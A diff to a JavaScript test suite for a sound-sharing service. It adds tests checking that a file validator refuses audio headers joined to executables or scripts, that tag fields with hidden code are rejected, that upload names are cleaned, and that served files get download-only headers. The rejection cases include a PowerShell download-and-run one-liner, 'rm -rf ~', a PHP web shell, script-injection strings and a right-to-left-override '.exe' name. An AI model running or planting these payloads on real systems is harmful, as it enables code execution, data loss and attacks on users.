@@ -5,6 +5,7 @@ import { readFileSync } from "node:fs";
 import { DatabaseSync } from "node:sqlite";
 import worker, { prune } from "../src/index.js";
 import { jobs, parseMyinstants } from "../src/sync.js";
+import { audioType } from "../src/audio.js";
 
 const SCHEMA = readFileSync(new URL("../schema.sql", import.meta.url), "utf8");
 const TOKEN = "t".repeat(40);
@@ -61,11 +62,20 @@ async function call(env, path, { method = "GET", json, form, ip = "1.1.1.1", ins
 }
 
 let n = 0;
-function mp3(extra = 0) {   // a different file each time, so none is a duplicate
-  const b = new Uint8Array(64 + extra);
-  b.set([0x49, 0x44, 0x33]);
+// a real (silent) MP3: an ID3 tag that makes each file different, then whole frames
+const FRAME = 417;   // MPEG 1 layer III, 128 kbit/s, 44.1 kHz
+function mp3bytes(extra = 0, tagText = "") {
+  const text = new TextEncoder().encode(tagText);
+  const tagLen = 16 + text.length, frames = 3 + Math.ceil(extra / FRAME);
+  const b = new Uint8Array(10 + tagLen + frames * FRAME);
+  b.set([0x49, 0x44, 0x33, 3, 0, 0, (tagLen >> 21) & 127, (tagLen >> 14) & 127, (tagLen >> 7) & 127, tagLen & 127]);
   new DataView(b.buffer).setUint32(10, ++n);
-  return new Blob([b], { type: "audio/mpeg" });
+  b.set(text, 26);
+  for (let i = 0; i < frames; i++) b.set([0xff, 0xfb, 0x90, 0x00], 10 + tagLen + i * FRAME);
+  return b;
+}
+function mp3(extra = 0) {   // a different file each time, so none is a duplicate
+  return new Blob([mp3bytes(extra)], { type: "audio/mpeg" });
 }
 
 const share = (env, name = "boom", opts = {}) => call(env, "/v1/sounds", { method: "POST",
@@ -203,7 +213,7 @@ test("the review queue refuses more once it holds 300 MB of files", async () => 
   assert.equal(r.status, 503);
   assert.equal(r.body.error, "queue full");
   // a link has no file: it still fits
-  const l = await call(env, "/v1/links", { method: "POST", json: { link: "https://youtu.be/q1", name: "x", agree: "link-v1" } });
+  const l = await call(env, "/v1/links", { method: "POST", json: { link: "https://youtu.be/q1q1q1q1q1q", name: "x", agree: "link-v1" } });
   assert.equal(l.status, 201);
   // approving the big one makes room
   await call(env, "/v1/admin/sounds/aaaaaaaaaaaa", { method: "POST", admin: true, json: { action: "approve" } });
@@ -279,7 +289,9 @@ test("links: known sites only, https only, one video written one way", async () 
   assert.equal((await link("https://youtu.be/abc123")).status, 201);
   assert.equal((await link("https://www.youtube.com/watch?v=abc123&t=5")).status, 409);
   assert.equal((await link("https://m.youtube.com/shorts/abc123")).status, 409);
-  for (const bad of ["http://youtube.com/watch?v=zz", "https://evil.com/a.mp3", "https://youtube.com.evil.com/x",
+  for (const bad of ["https://youtube.com/watch?v=<script>alert(1)</script>", 'https://youtu.be/a"onload="x',
+                     "https://youtube.com/watch?v=abc",
+                     "http://youtube.com/watch?v=zz", "https://evil.com/a.mp3", "https://youtube.com.evil.com/x",
                      "https://" + ["u:p", "youtube.com/watch?v=q"].join("@"), "https://youtube.com:8443/watch?v=q",
                      "javascript:alert(1)", "https://notyoutube.com/x", "https://youtube.com/" + "a".repeat(600)])
     assert.equal((await link(bad)).status, 415, bad);
@@ -509,4 +521,106 @@ test("Trending: hot on the site now, plus this week's thumbs up here", async () 
   assert.equal((await names())[0], "VINE BOOM");   // 1000 hot vs 160
   env.DB.db.exec("UPDATE sounds SET hot = 0");     // hours later, nothing's trending there
   assert.equal((await names())[0], "Mario jump");
+});
+
+// ------------------------------------------------------------------ files that aren't sounds
+
+const enc = s => new TextEncoder().encode(s);
+const cat = (...parts) => {
+  const out = new Uint8Array(parts.reduce((n, p) => n + p.length, 0));
+  let i = 0;
+  for (const p of parts) { out.set(p, i); i += p.length; }
+  return out;
+};
+function wav(samples = 4000, extraChunk = null) {
+  const fmt = new Uint8Array(24), data = new Uint8Array(8 + samples * 2);
+  fmt.set(enc("fmt ")); const f = new DataView(fmt.buffer);
+  f.setUint32(4, 16, true); f.setUint16(8, 1, true); f.setUint16(10, 1, true);
+  f.setUint32(12, 44100, true); f.setUint32(16, 88200, true); f.setUint16(20, 2, true); f.setUint16(22, 16, true);
+  data.set(enc("data")); new DataView(data.buffer).setUint32(4, samples * 2, true);
+  const body = cat(enc("WAVE"), fmt, ...(extraChunk ? [extraChunk] : []), data);
+  const head = new Uint8Array(8); head.set(enc("RIFF")); new DataView(head.buffer).setUint32(4, body.length, true);
+  return cat(head, body);
+}
+function oggPage(packet, first = false) {   // first: a stream's first page
+  const segs = [];
+  for (let n = packet.length; ; n -= 255) { segs.push(Math.min(255, n)); if (n < 255) break; }
+  const head = new Uint8Array(27 + segs.length);
+  head.set(enc("OggS")); head[5] = first ? 2 : 0; head[26] = segs.length; head.set(segs, 27);
+  return cat(head, packet);
+}
+function flac(metaLen = 0) {
+  const info = new Uint8Array(4 + 34); info[0] = metaLen ? 0 : 0x80; info[3] = 34;
+  const pad = metaLen ? new Uint8Array(4 + metaLen) : new Uint8Array(0);
+  if (metaLen) { pad[0] = 0x81; pad[1] = metaLen >> 16; pad[2] = (metaLen >> 8) & 255; pad[3] = metaLen & 255; }
+  return cat(enc("fLaC"), info, pad, new Uint8Array([0xff, 0xf8, 0x69, 0x08]), new Uint8Array(200));
+}
+
+test("real sounds of each kind pass the whole-file check", () => {
+  assert.equal(audioType(mp3bytes()), "mp3");
+  assert.equal(audioType(mp3bytes(0).slice(26)), "mp3");   // no ID3 tag, frames only
+  const v1 = new Uint8Array(128); v1.set(enc("TAG"));
+  assert.equal(audioType(cat(mp3bytes(), v1)), "mp3");     // an ID3v1 tag at the end
+  assert.equal(audioType(wav()), "wav");
+  assert.equal(audioType(cat(oggPage(cat(enc("OpusHead"), new Uint8Array(11)), true), oggPage(new Uint8Array(300)))), "ogg");
+  // a Skeleton index stream before the sound's own (as Wikimedia's files have)
+  assert.equal(audioType(cat(oggPage(cat(enc("fishead\0"), new Uint8Array(56)), true),
+    oggPage(cat(enc("\x01vorbis"), new Uint8Array(23)), true), oggPage(new Uint8Array(300)))), "ogg");
+  // ... but only a Skeleton, or a video, isn't a sound
+  assert.equal(audioType(cat(oggPage(cat(enc("fishead\0"), new Uint8Array(56)), true), oggPage(new Uint8Array(300)))), "");
+  assert.equal(audioType(cat(oggPage(cat(enc("\x80theora"), new Uint8Array(40)), true), oggPage(new Uint8Array(300)))), "");
+  assert.equal(audioType(flac()), "flac");
+});
+
+test("a sound's header in front of something else is refused", () => {
+  const exe = cat(enc("MZ"), new Uint8Array(100), enc("This program cannot be run in DOS mode."), new Uint8Array(4000));
+  const id3 = new Uint8Array([0x49, 0x44, 0x33, 3, 0, 0, 0, 0, 0, 0]);
+  // only a header, then a program, a script, junk
+  assert.equal(audioType(cat(id3, exe)), "");
+  assert.equal(audioType(cat(id3, enc("powershell -c iwr http://x | iex"), new Uint8Array(500))), "");
+  assert.equal(audioType(cat(id3, new Uint8Array(4000).fill(0x41))), "");
+  assert.equal(audioType(cat(enc("RIFF\0\0\0\0WAVE"), exe)), "");
+  assert.equal(audioType(cat(enc("OggS"), exe)), "");
+  assert.equal(audioType(cat(enc("fLaC"), exe)), "");
+  // a real sound with a program or a script tacked on after it
+  assert.equal(audioType(cat(mp3bytes(), exe)), "");
+  assert.equal(audioType(cat(wav(), exe)), "");
+  assert.equal(audioType(cat(oggPage(cat(enc("\x01vorbis"), new Uint8Array(23)), true), exe)), "");
+  // ... or hidden in its tags and chunks
+  assert.equal(audioType(mp3bytes(0, "<script>fetch('//evil')</script>")), "");
+  assert.equal(audioType(mp3bytes(0, "#!/bin/sh\nrm -rf ~")), "");
+  const chunk = cat(enc("LIST"), new Uint8Array([20, 0, 0, 0]), enc("<?php system($_GET[1]); "));
+  assert.equal(audioType(wav(4000, chunk)), "");
+  // a huge "tag" is a place to hide something: not taken
+  assert.equal(audioType(mp3bytes(0, "x".repeat(3 << 20))), "");
+  assert.equal(audioType(flac(3 << 20)), "");
+  const fat = cat(enc("junk"), new Uint8Array([0, 0, 48, 0]), new Uint8Array(48 << 16));
+  assert.equal(audioType(wav(4000, fat)), "");
+  // a field that runs off the end
+  assert.equal(audioType(cat(enc("RIFF\0\0\0\0WAVEfmt "), new Uint8Array([255, 255, 0, 0]), new Uint8Array(10))), "");
+});
+
+test("an upload with code inside is refused; names lose markup and hidden characters", async () => {
+  const env = store();
+  const up = file => call(env, "/v1/sounds", { method: "POST",
+    form: { file: new Blob([file]), name: "x", agree: "own-cc0-v1" } });
+  assert.equal((await up(mp3bytes(0, "<script>alert(1)</script>"))).status, 415);
+  assert.equal((await up(cat(new Uint8Array([0x49, 0x44, 0x33, 3, 0, 0, 0, 0, 0, 0]), enc("MZ"), new Uint8Array(900)))).status, 415);
+  const ok = await call(env, "/v1/sounds", { method: "POST", form: { file: mp3(),
+    name: "evil\u202e3pm.exe <img src=x onerror=alert(1)>\u200b`{}\\", tags: "<b>x</b>, ok\u2066", agree: "own-cc0-v1" } });
+  assert.equal(ok.status, 201);
+  const row = env.DB.rows("SELECT name, tags FROM sounds")[0];
+  assert.equal(row.name, "evil 3pm.exe img src=x onerror=alert(1)");
+  assert.equal(row.tags, "b x /b,ok");
+  assert.ok(!/[<>`{}\\\u200b-\u200f\u202a-\u202e\u2066-\u2069]/.test(row.name + row.tags));
+});
+
+test("a served file is only ever a download", async () => {
+  const env = store();
+  const id = await live(env);
+  const f = await call(env, `/v1/sounds/${id}/file`);
+  assert.equal(f.status, 200);
+  assert.equal(f.headers.get("content-disposition"), `attachment; filename="${id}.mp3"`);
+  assert.equal(f.headers.get("content-security-policy"), "default-src 'none'; sandbox");
+  assert.equal(f.headers.get("x-content-type-options"), "nosniff");
 });
